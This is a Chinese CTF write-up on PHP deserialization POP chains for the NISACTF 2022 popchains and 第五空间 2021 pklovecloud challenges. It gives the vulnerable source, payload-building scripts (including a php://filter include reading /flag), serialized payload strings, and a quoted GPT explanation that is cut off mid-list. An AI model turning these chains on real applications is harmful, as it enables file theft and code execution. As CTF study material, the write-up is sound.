<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun==&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun=$val[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line"></span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun=$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb = $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name=$value;</span><br><span class="line">        if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;ser&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;ser&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//func checkcheck($data)&#123;</span><br><span class="line">//  if(preg_match(......))&#123;</span><br><span class="line">//      die(something wrong);</span><br><span class="line">//  &#125;</span><br><span class="line">//&#125;</span><br><span class="line"></span><br><span class="line">//function hint()&#123;</span><br><span class="line">//    echo &quot;.......&quot;;</span><br><span class="line">//    die();</span><br><span class="line">//&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p>一进去是源码进来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/ </span><br></pre></td></tr></table></figure>
<p>这里还需要特别注意一个东西，也就是对于__toString的触发<br>最常见到的便是echo来触发这个，然后就是这里的给一个对象进行赋值<br>原本做到这个以为自己又会了，结果发现还有__get方法的调用不是很清晰，又回去补充了一下笔记再来做这道题目<br>这样链子就清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">//    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">//        $this-&gt;page = $file;</span><br><span class="line">//    &#125;</span><br><span class="line">//    public function __toString()&#123;</span><br><span class="line">//        return $this-&gt;string-&gt;page;</span><br><span class="line">//    &#125;</span><br><span class="line">//</span><br><span class="line">//    public function __wakeup()&#123;</span><br><span class="line">//        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">//            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">//            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">//        &#125;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var= &#x27;php://filter/convert.base64-encode/resource=/flag&#x27;;</span><br><span class="line">//    public function append($value)&#123;</span><br><span class="line">//        include($value);</span><br><span class="line">//    &#125;</span><br><span class="line">//    public function __invoke()&#123;</span><br><span class="line">//        $this-&gt;append($this-&gt;var);</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort ;</span><br><span class="line">//    public function __construct()&#123;</span><br><span class="line">//        $this-&gt;effort = array();</span><br><span class="line">//    &#125;</span><br><span class="line">//</span><br><span class="line">//    public function __get($key)&#123;</span><br><span class="line">//        $function = $this-&gt;effort;</span><br><span class="line">//        return $function();</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =  new Road_is_Long();</span><br><span class="line">$b = new Make_a_Change();</span><br><span class="line">$c = new Try_Work_Hard();</span><br><span class="line">$a-&gt;page= $a;</span><br><span class="line">$a-&gt;string=$b;</span><br><span class="line">$b-&gt;effort=$c;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>最后的paylaod就是这个，我们需要特别注意最后的有个地方，实例化一个类后，需要对此类的对象再实例化，就特别需要注意说不要两次调用，先把需要的都实例化了，再来调用</p>
<h1 id="第五空间-2021-pklovecloud"><a href="#第五空间-2021-pklovecloud" class="headerlink" title="[第五空间 2021]pklovecloud"></a>[第五空间 2021]pklovecloud</h1><p>1分<br>反序列化PHPPhar反序列化<br>这里为什么是phar反序列化？第一遍看的时候觉得不是，特殊之处就是说，我这里需要给这个构造两个payload，这样才可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp</span><br><span class="line">&#123;</span><br><span class="line">    protected $cinder;</span><br><span class="line">    public $neutron=&#x27;111&#x27;;</span><br><span class="line">    public $nova=&#x27;111&#x27;;</span><br><span class="line">//    function __construct()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;cinder = new pkshow;</span><br><span class="line">//    &#125;</span><br><span class="line">//    function __toString()</span><br><span class="line">//    &#123;</span><br><span class="line">//        if (isset($this-&gt;cinder))</span><br><span class="line">//            return $this-&gt;cinder-&gt;echo_name();</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker;</span><br><span class="line">//    function echo_name()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">//        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">//        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">//        &#123;</span><br><span class="line">//            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">//            if (file_get_contents($file))</span><br><span class="line">//            &#123;</span><br><span class="line">//                return file_get_contents($file);</span><br><span class="line">//            &#125;</span><br><span class="line">//            else</span><br><span class="line">//            &#123;</span><br><span class="line">//                return &quot;keystone lost~&quot;;</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p =  new acp();</span><br><span class="line">$e =  new ace();</span><br><span class="line">$e-&gt;docker = new acp();</span><br><span class="line">echo serialize($e-&gt;docker)</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;acp&quot;:3:&#123;s:9:&quot; * cinder&quot;;N;s:7:&quot;neutron&quot;;s:3:&quot;111&quot;;s:4:&quot;nova&quot;;s:3:&quot;111&quot;;&#125; </span><br></pre></td></tr></table></figure>
<p>这里再改动一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">还有就是注意protected受保护属性序列化时，在变量名面前加上“%00*%00”,后面就没有加了</span><br><span class="line">private私有属性序列化时，会在pub名字前加类名test,testpub明明是7个，为什么会是九个呢？在变量名面前加&quot;%00类名（test）%00pub&quot;;这样就是九个了</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;acp&quot;:3:&#123;s:9:&quot;%00*%00cinder&quot;;N;s:7:&quot;neutron&quot;;s:3:&quot;111&quot;;s:4:&quot;nova&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>再构造一次paylaod，发现拿不到flag，这里有三个问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp</span><br><span class="line">&#123;</span><br><span class="line">    protected $cinder;</span><br><span class="line">    public $neutron=&#x27;111&#x27;;</span><br><span class="line">    public $nova=&#x27;111&#x27;;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;cinder = new ace;</span><br><span class="line">    &#125;</span><br><span class="line">//    function __toString()</span><br><span class="line">//    &#123;</span><br><span class="line">//        if (isset($this-&gt;cinder))</span><br><span class="line">//            return $this-&gt;cinder-&gt;echo_name();</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;</span><br><span class="line">    public $filename=&#x27;flag.php&#x27;;</span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker = &#x27;O:3:&quot;acp&quot;:3:&#123;s:9:&quot;%00*%00cinder&quot;;N;s:7:&quot;neutron&quot;;s:3:&quot;111&quot;;s:4:&quot;nova&quot;;s:3:&quot;111&quot;;&#125;&#x27;;</span><br><span class="line">//    function echo_name()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;openstack = unserialize($this-&gt;docker);</span><br><span class="line">//        $this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line">//        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line">//        &#123;</span><br><span class="line">//            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;</span><br><span class="line">//            if (file_get_contents($file))</span><br><span class="line">//            &#123;</span><br><span class="line">//                return file_get_contents($file);</span><br><span class="line">//            &#125;</span><br><span class="line">//            else</span><br><span class="line">//            &#123;</span><br><span class="line">//                return &quot;keystone lost~&quot;;</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">//    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p =  new acp();</span><br><span class="line">$e =  new ace();</span><br><span class="line">$e-&gt;docker = new acp();</span><br><span class="line">echo urlencode(serialize($p));</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>1.这个主要的函数，file_get_contents($file);这个就是让你来phar反序列化的<br>2. $this-&gt;openstack-&gt;neutron &#x3D; $heat;它不是包含了一个文件吗？这里如果要赋值的话那就的地址才行<br>3.  function __construct()<br>    {<br>        $this-&gt;cinder &#x3D; new ace;<br>    }<br>    这个在这里里面实例化为一个对象，外面不需要再加上我们的（）的</p>
<p>ok，看wp了，补充一些知识<br>file_get_contents($file)可以实现包含文件的功能，不一定就是phar反序列化了<br>__toString的触发方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.对一个对象进行echo操作或者print操作时可以触发</span><br><span class="line">2.声明的变量赋值为对象后与字符串做弱类型比较时会触发</span><br><span class="line">3.声明的变量赋值为对象后进行正则表达式时会触发</span><br><span class="line">4.声明的变量赋值为对象后进行大小写转化等等可以触发</span><br></pre></td></tr></table></figure>
<p>还有这里，我上面的paylaod还有错误的，有一个思路上的错误<br>前面的链子其实都没有什么大的问题，注意理解下面的一句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个然后在上面有$this-&gt;$openstack = unserialize($this-&gt;docker)，因此只要我们使</span><br><span class="line">得$this-&gt;docker =null，然后让$this-&gt;filename=”flag.php”即可使得上面的判断成立</span><br><span class="line">并且读取 flag.php。这个wp写的是我们我有一些问题，一个就是说，this-&gt;$openstack = unserialize($this-&gt;docker)，因此只要我们使</span><br><span class="line">得$this-&gt;docker =null。这个明明opebstack为什么null了，为什么还可以在里面调用,opebstack这个为什么都为null了，不是一个类，但是还可以调用</span><br></pre></td></tr></table></figure>
<p>关于这个疑问的gpt解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">非常好，我们来详细分析你现在提供的代码逻辑，尤其是你反复提到的这个点：</span><br><span class="line"></span><br><span class="line">    为什么 $b-&gt;docker = null 就可以成功拿到 flag.php？</span><br><span class="line"></span><br><span class="line">✅ 第一部分：确认关键逻辑链</span><br><span class="line"></span><br><span class="line">这是你写的核心触发链：</span><br><span class="line"></span><br><span class="line">// 创建对象并赋值</span><br><span class="line">$a = new acp();    // 触发 __construct() -&gt; $this-&gt;cinder = new ace;</span><br><span class="line">$b = new ace();</span><br><span class="line">$b-&gt;docker = null;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">然后你访问：</span><br><span class="line"></span><br><span class="line">vuln.php?pks=&lt;payload&gt;</span><br><span class="line"></span><br><span class="line">触发了：</span><br><span class="line"></span><br><span class="line">$logData = unserialize($_GET[&#x27;pks&#x27;]);</span><br><span class="line">echo $logData;</span><br><span class="line"></span><br><span class="line">✅ 第二部分：哪段代码被实际调用？</span><br><span class="line"></span><br><span class="line">我们注意到：</span><br><span class="line"></span><br><span class="line">    echo $logData; 是在输出反序列化得到的对象 $logData。</span><br><span class="line"></span><br><span class="line">    所以，如果你传入的是 acp 的对象，echo 会触发 acp::__toString()。</span><br><span class="line"></span><br><span class="line">    acp::__toString() 返回 $this-&gt;cinder-&gt;echo_name()。</span><br><span class="line"></span><br><span class="line">function __toString() &#123;</span><br><span class="line">    if (isset($this-&gt;cinder)) &#123;</span><br><span class="line">        return $this-&gt;cinder-&gt;echo_name();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    也就是说，只要你控制 $this-&gt;cinder 是 ace 类型，那么就能调用 ace::echo_name()。</span><br><span class="line"></span><br><span class="line">✅ 第三部分：来看 ace::echo_name() 的关键逻辑</span><br><span class="line"></span><br><span class="line">function echo_name() &#123;</span><br><span class="line">    $this-&gt;openstack = unserialize($this-&gt;docker);   // line A</span><br><span class="line">    $this-&gt;openstack-&gt;neutron = $heat;               // line B</span><br><span class="line">    if ($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova) &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">你说你设置了 $this-&gt;docker = null，为什么还能执行下去？</span><br><span class="line">🧠 第四部分：关键点来了 —— unserialize(null) 的行为</span><br><span class="line"></span><br><span class="line">我们来实测并分析：</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(null)); // bool(false)</span><br><span class="line"></span><br><span class="line">所以：</span><br><span class="line"></span><br><span class="line">$this-&gt;openstack = false;</span><br><span class="line"></span><br><span class="line">然后执行：</span><br><span class="line"></span><br><span class="line">$this-&gt;openstack-&gt;neutron = $heat;</span><br><span class="line"></span><br><span class="line">    这是对 false 赋对象属性，PHP 中会发生什么？</span><br><span class="line"></span><br><span class="line">❗ PHP 的魔法行为：自动把标量变成 stdClass</span><br><span class="line"></span><br><span class="line">是的，这就是很多 PHP 利用链中的关键！</span><br><span class="line">✅ 在 PHP 中，你给 null 或 false 等非对象类型赋一个属性时，会自动转成 stdClass 对象。</span><br><span class="line"></span><br><span class="line">这是你问的重点：</span><br><span class="line"></span><br><span class="line">    ❓“$this-&gt;openstack = false（因为 unserialize(null)），为什么还能赋属性？”</span><br><span class="line"></span><br><span class="line">✅ 举个例子：</span><br><span class="line"></span><br><span class="line">$x = false;</span><br><span class="line">$x-&gt;neutron = &quot;abc&quot;;</span><br><span class="line">var_dump($x);  // object(stdClass)#1 (1) &#123; [&quot;neutron&quot;]=&gt; string(3) &quot;abc&quot; &#125;</span><br><span class="line"></span><br><span class="line">你可以在本地 PHP 跑一下验证：这是合法的！</span><br><span class="line">✅ 所以在你的场景中会变成这样：</span><br><span class="line"></span><br><span class="line">$this-&gt;docker = null;</span><br><span class="line">$this-&gt;openstack = unserialize(null); // -&gt; false</span><br><span class="line"></span><br><span class="line">// line B:</span><br><span class="line">$this-&gt;openstack-&gt;neutron = $heat; </span><br><span class="line">// -&gt; openstack 自动变成 stdClass，now has neutron</span><br><span class="line"></span><br><span class="line">// 接着你又写：</span><br><span class="line">if ($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</span><br><span class="line"></span><br><span class="line">此时：</span><br><span class="line"></span><br><span class="line">$this-&gt;openstack-&gt;nova == null; // 因为 stdClass 没有 nova</span><br><span class="line"></span><br><span class="line">你只需要控制 $heat = null，就有：</span><br><span class="line"></span><br><span class="line">$this-&gt;openstack-&gt;neutron = null;</span><br><span class="line">$this-&gt;openstack-&gt;nova = null; // 不存在的属性，值为 null</span><br><span class="line"></span><br><span class="line">// 所以判断成立</span><br><span class="line">if (null === null) // true</span><br><span class="line"></span><br><span class="line">✅ 最终效果：</span><br><span class="line"></span><br><span class="line">    $filename = &#x27;flag.php&#x27; → 读取文件成功；</span><br><span class="line"></span><br><span class="line">    